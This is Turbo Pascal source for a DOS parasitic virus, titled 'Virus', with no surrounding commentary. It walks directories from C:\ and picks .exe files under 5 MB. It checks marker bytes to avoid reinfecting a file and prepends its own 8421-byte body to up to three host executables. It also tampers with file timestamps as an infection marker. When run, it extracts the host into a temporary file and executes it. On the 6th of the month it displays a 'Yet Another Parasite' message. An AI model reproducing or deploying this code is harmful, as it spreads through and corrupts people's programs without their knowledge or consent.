   {$M 8192,0,5000}
   program Virus;
   uses _disc_,dos;
   type
    pdelbak=^tdelbak;
    tdelbak=object(tdisc)
   procedure handle;virtual;
   end;
   var ch: char;
       dir:dirstr;
       db:pdelbak;
       str2,Command:string;
       s2,s:searchrec;
       cont:integer;
       fis1,fis2:text;
       y,m,d,dow:Word;
       ftime,sze,c : Longint;
       dt : DateTime;
       P: PathStr;
       D2: DirStr;
       N: NameStr;
       E: ExtStr;
   label 1;
   procedure tdelbak.handle;
   var str:string;
       j,m,siz:longint;
       s,s3:searchrec;
       f,g:file;
       finf,f2:text;
       i:integer;
       inf,inf2:boolean;
       octc,octs:word;
       buf:array[1..2048] of char;sursa,dest:string;
   begin
   findfirst('*.exe',archive,s);
   while (doserror=0)and(cont<3) do
   begin
   inf:=false;
   inf2:=false;
   GetDir(0,str);
   Assign(f2,s.name);
   reset(f2);
   siz:=s.size;
   for j:=1 to siz do
   begin
   read(f2,ch);
   if (j=8400)and(ch='0') then inf:=true;
   if (j=8401)and(ch='0') then inf2:=true;
   end;
   close(f2);
   if (s.name<>s2.name)and(inf=false)and(inf2=false)and(s.size<5000000) then
   begin
   i:=0;
   cont:=cont+1;
   siz:=s.size;
   assign(f,s.name);
   SetFAttr(f,Archive);
   reset(f,1);
   assign(g,'x.exe');
   rewrite(g,1);
   repeat
   Blockread(f,buf,sizeof(buf),octc);
   Blockwrite(g,buf,octc,octs);
   until (octc=0)or(octs<>octc);
   close(f);
   close(g);
   assign(finf,str2+'\'+s2.name);
   reset(finf);
   assign(f2,'y.exe');
   rewrite(f2);
   for j:=1 to sze do
   begin
   if j<=8421 then
   begin
   read(finf,ch);
   write(f2,ch);
   end;
   end;
   close(f2);
   close(finf);
   assign(f,s.name);
   erase(f);
   assign(f2,'x.exe');
   reset(f2);
   assign(finf,'y.exe');
   append(finf);
   for j:=1 to siz do
   begin
   read(f2,ch);
   write(finf,ch);
   end;
   close(f2);
   close(finf);
   assign(f,'y.exe');
   rename(f,s.name);
   assign(g,'x.exe');
   erase(g);
   Assign(finf,s.name);
   reset(finf);
   GetFtime(finf,ftime);
   UnpackTime(ftime,dt);
   dt.day:=0;
   PackTime(dt,ftime);
   SetFTime(finf,ftime);
   close(finf);
   end;
   findnext(s);
   end;
   end;
   begin
   GetDir(0,str2);
   cont:=length(str2)+1;
   str2:=Paramstr(0);
   delete(str2,1,cont);
   s2.name:=str2;
   GetDir(0,str2);
   FindFirst(s2.name,AnyFile,s);
   sze:=s.size;
   cont:=0;
   dir:='C:\';
   new(db,init(dir));
   db^.run;
   dispose(db,done);
   assign(fis1,s2.name);
   reset(fis1);
   assign(fis2,'f.exe');
   rewrite(fis2);
   append(fis2);
   FindFirst(s2.name,AnyFile,s);
   sze:=s.size;
   for c:=1 to sze do
   begin
   read(fis1,ch);
   if c>8421 then
   begin
   write(fis2,ch);
   end;
   end;
   close(fis1);
   close(fis2);
   Command:='f.exe';
   Command:='/C ' + Command;
   SwapVectors;
   Exec(GetEnv('COMSPEC'), Command);
   SwapVectors;
   assign(fis1,'f.exe');
   erase(fis1);
   GetDate(y,m,d,dow);
   if d=6 then
   begin
   writeln('Yap! What could it B ?¨ It''s Y.A.P. (Yet Another Parasite)');
   readln;
   end;
   end.
